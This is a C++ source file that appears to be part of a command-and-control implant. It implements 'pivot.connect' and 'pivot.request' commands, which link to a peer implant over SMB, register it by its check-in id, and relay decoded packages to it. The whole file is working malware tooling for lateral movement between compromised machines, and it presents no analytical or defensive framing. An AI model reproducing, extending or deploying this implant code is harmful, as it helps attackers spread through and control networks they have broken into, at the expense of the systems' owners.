#include "Command.h"
#include "Stdlib.h"
#include "Peer.h"
#include "Debug.h"

BOOL CommandPivotConnect( json& args, string artifact, json& result ) {
    DWORD Type        = args[0].get<DWORD>();
    VOID* Checkin     = NULL;
    DWORD CheckinSize = 0;
    PVOID PeerContext = NULL;
    DWORD ConfigSize  = 0;
    VOID* Config      = Base64Decode( artifact.c_str(), &ConfigSize );

    if (Type == PEER_TYPE_SMB) {
        if (!PeerConnect( Type, &PeerContext, &Checkin, &CheckinSize, Config, ConfigSize )) {
            printf( "Failed to connect to peer implant\n" );
            result["name"]   = "pivot.connect";
            result["output"] = "failed to connect to peer implant";
            return FALSE;
        }

        json CheckinResopnse = json::parse( (CHAR*)Checkin, (CHAR*)Checkin + CheckinSize );

        if (!PeerRegister( Type, CheckinResopnse["id"].get<DWORD>(), PeerContext )) {
            printf( "Failed to register peer implant\n" );
            result["name"]   = "pivot.connect";
            result["output"] = "failed to register peer implant";
            return FALSE;
        }

        result["name"]     = "pivot.connect";
        result["artifact"] = CheckinResopnse.dump().c_str();
        result["output"]   = "connected to peer implant";
        return TRUE;
    }

    return TRUE;
}

BOOL CommandPivotRequest( json& args, string artifact, json& result ) {
    DWORD Size      = 0;
    PBYTE Data      = NULL;
    DWORD ImplantID = args[0].get<DWORD>();
    json  Request;

    result["name"] = "pivot.request";
    Data           = Base64Decode( artifact.c_str(), &Size );
    if (Data == NULL) {
        result["name"] = "failed to decode artifact";
        printf( "failed to decode artifact" );
        return FALSE;
    }

    if (!PeerRequest( ImplantID, Data, Size )) {
        DBG_PRINTF( "failed to send package to p2p implant\n" );
        result["output"] = "failed to send package to peer implant";

        return FALSE;
    }

    result["output"] = "send package to peer implant";
    DBG_PRINTF( "package sent to p2p implant\n" );
    HeapFree( GetProcessHeap(), 0, Data );

    return TRUE;
}
